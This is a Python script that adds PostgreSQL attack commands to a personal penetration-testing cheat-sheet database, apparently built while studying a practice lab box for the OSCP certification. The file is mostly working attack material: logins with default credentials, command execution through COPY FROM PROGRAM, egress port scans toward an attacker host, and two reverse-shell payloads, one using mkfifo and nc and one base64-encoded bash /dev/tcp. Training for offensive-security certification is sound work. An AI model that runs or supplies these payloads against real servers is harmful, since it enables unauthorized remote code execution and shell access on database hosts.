#!/usr/bin/env python3
"""
Patch: PostgreSQL COPY FROM PROGRAM RCE
Adds PostgreSQL RCE and enumeration commands to oscp_commands.db
Techniques learned from Nibbles (PG Practice)
"""

import sqlite3
import os

DB_PATH = "/opt/freeworldops/FreeworldOps/oscp_commands.db"

entries = [
    (
        "psql",
        "Connect to remote PostgreSQL with default creds (postgres:postgres). Port is often 5432 or shifted (e.g. 5437). If blank password fails, try 'postgres'.",
        "psql -h <IP> -p 5437 -U postgres",
        "recon",
        "psql,postgresql,database,default-creds"
    ),
    (
        "psql",
        "Test RCE via COPY FROM PROGRAM -- confirms command execution as postgres OS user. Run this first before attempting reverse shell.",
        "CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;",
        "web",
        "psql,postgresql,rce,command-execution"
    ),
    (
        "psql",
        "Test outbound connectivity from target to confirm which ports are allowed egress before sending reverse shell. 'Connection refused' = port reachable, 'timed out' = firewalled.",
        "COPY cmd_exec FROM PROGRAM 'nc -zv -w2 <ATTACKER_IP> <PORT> > /tmp/nctest.txt 2>&1; cat /tmp/nctest.txt'; SELECT * FROM cmd_exec;",
        "web",
        "psql,postgresql,egress,firewall,connectivity"
    ),
    (
        "psql",
        "Write and execute a port scan script from PostgreSQL to find open egress ports. Run bash script separately to avoid exit-code issues from nc failures.",
        "COPY cmd_exec FROM PROGRAM 'echo ''#!/bin/bash'' > /tmp/scan.sh'; COPY cmd_exec FROM PROGRAM 'echo ''for p in 80 443 53 21 8080 4444 3389; do nc -zv -w2 <ATTACKER_IP> $p 2>&1 >> /tmp/r.txt; done'' >> /tmp/scan.sh'; COPY cmd_exec FROM PROGRAM 'bash /tmp/scan.sh; cat /tmp/r.txt'; SELECT * FROM cmd_exec;",
        "web",
        "psql,postgresql,egress,portscan,firewall"
    ),
    (
        "psql",
        "PostgreSQL reverse shell via mkfifo named pipe. Use port confirmed open via egress test. COPY FROM PROGRAM runs under /bin/sh so /dev/tcp won't work -- use mkfifo+nc instead.",
        "DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <ATTACKER_IP> <PORT> >/tmp/f';",
        "shells",
        "psql,postgresql,reverse-shell,mkfifo,nc,rce"
    ),
    (
        "psql",
        "PostgreSQL reverse shell using base64-encoded payload to avoid quoting issues. Generate base64 with: echo -ne 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' | base64 -w0",
        "DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'echo <BASE64> | base64 -d | bash';",
        "shells",
        "psql,postgresql,reverse-shell,base64,rce"
    ),
    (
        "psql",
        "Check PostgreSQL superuser status and version. Superuser = can use COPY FROM PROGRAM for RCE. Must confirm this before attempting command execution.",
        "SELECT current_user, pg_postmaster_start_time(), version(); SELECT usesuper FROM pg_user WHERE usename = current_user;",
        "recon",
        "psql,postgresql,enumeration,superuser,version"
    ),
]

def patch():
    if not os.path.exists(DB_PATH):
        print(f"[-] Database not found at {DB_PATH}")
        return

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    inserted = 0
    skipped = 0

    for tool, description, command, category, tags in entries:
        c.execute("SELECT id FROM commands WHERE command = ?", (command,))
        if c.fetchone():
            print(f"[~] Skipping duplicate: {description[:60]}...")
            skipped += 1
        else:
            c.execute(
                "INSERT INTO commands (tool, description, command, category, tags) VALUES (?, ?, ?, ?, ?)",
                (tool, description, command, category, tags)
            )
            print(f"[+] Added: {description[:60]}...")
            inserted += 1

    conn.commit()
    conn.close()
    print(f"\n[+] Done -- {inserted} inserted, {skipped} skipped.")
    print(f"[+] Search with: oscp postgres  OR  oscp --cat shells")

if __name__ == "__main__":
    patch()
